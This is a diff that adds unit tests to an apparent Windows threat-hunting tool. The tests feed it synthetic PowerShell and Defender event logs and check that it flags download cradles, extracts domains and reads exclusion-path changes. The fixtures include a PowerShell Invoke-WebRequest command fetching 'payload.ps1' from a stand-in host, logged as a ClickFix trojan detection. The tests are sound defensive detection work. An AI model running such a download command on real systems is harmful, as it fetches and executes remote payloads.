@@ -167,6 +167,85 @@ class RuleTests(unittest.TestCase):
         self.assertEqual(report["findings"][0]["category"], "defender_routine_configuration_event")
         self.assertEqual(report["findings"][0]["severity"], "low")
 
+    def test_powershell_download_context_extracts_domains(self):
+        collection = {
+            "artifacts": {
+                "installed_programs": [],
+                "services": [],
+                "service_install_events": [],
+                "scheduled_tasks": [],
+                "startup_registry": [],
+                "startup_folders": [],
+                "recent_files": [],
+                "defender_events": [],
+                "powershell_events": [
+                    {
+                        "id": 403,
+                        "message": "HostApplication=powershell.exe -NoProfile -Command Invoke-WebRequest -Uri 'https://phishanalyze.mdpstudio.com.au/api/health' -UseBasicParsing",
+                    }
+                ],
+                "process_creation_events": [],
+                "wmi_events": []
+            },
+            "collection_errors": []
+        }
+        report = rmm_hunter.analyze_artifacts(collection)
+        artifact = report["findings"][0]["artifacts"][0]
+
+        self.assertEqual(report["findings"][0]["category"], "powershell_download_cradle")
+        self.assertIn("phishanalyze.mdpstudio.com.au", artifact["network_domains"])
+        self.assertIn("PowerShell referenced phishanalyze.mdpstudio.com.au", artifact["detail"])
+
+    def test_defender_context_extracts_action_resource_and_setting_values(self):
+        collection = {
+            "artifacts": {
+                "installed_programs": [],
+                "services": [],
+                "service_install_events": [],
+                "scheduled_tasks": [],
+                "startup_registry": [],
+                "startup_folders": [],
+                "recent_files": [],
+                "defender_events": [
+                    {
+                        "log_name": "Microsoft-Windows-Windows Defender/Operational",
+                        "id": 1117,
+                        "time_created_utc": "2026-05-07T00:00:00Z",
+                        "data": {
+                            "Threat Name": "Trojan:Win32/ClickFix.EEI!MTB",
+                            "Action Name": "Remove",
+                            "Error Description": "The operation completed successfully.",
+                            "Detection Time": "2026-05-07T00:00:00Z",
+                            "Source Name": "System",
+                            "Path": "CmdLine:_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command Invoke-WebRequest https://example.test/payload.ps1",
+                        },
+                    },
+                    {
+                        "log_name": "Microsoft-Windows-Windows Defender/Operational",
+                        "id": 5007,
+                        "time_created_utc": "2026-05-07T00:01:00Z",
+                        "data": {
+                            "Old Value": "HKLM\\Software\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x1",
+                            "New Value": "HKLM\\Software\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0",
+                        },
+                    },
+                ],
+                "powershell_events": [],
+                "process_creation_events": [],
+                "wmi_events": []
+            },
+            "collection_errors": []
+        }
+        report = rmm_hunter.analyze_artifacts(collection)
+        malware_artifact = next(f for f in report["findings"] if f["category"] == "defender_malware_event")["artifacts"][0]
+        config_artifact = next(f for f in report["findings"] if f["category"] == "defender_sensitive_configuration_event")["artifacts"][0]
+
+        self.assertEqual(malware_artifact["threat_name"], "Trojan:Win32/ClickFix.EEI!MTB")
+        self.assertEqual(malware_artifact["defender_action"], "Remove")
+        self.assertIn("powershell.exe", malware_artifact["affected_resource"].lower())
+        self.assertIn("Exclusions\\Paths", config_artifact["new_setting_path"])
+        self.assertEqual(config_artifact["new_setting_value"], "0x0")
+
     def test_release_manifest_powershell_is_treated_as_self_noise(self):
         collection = {
             "artifacts": {
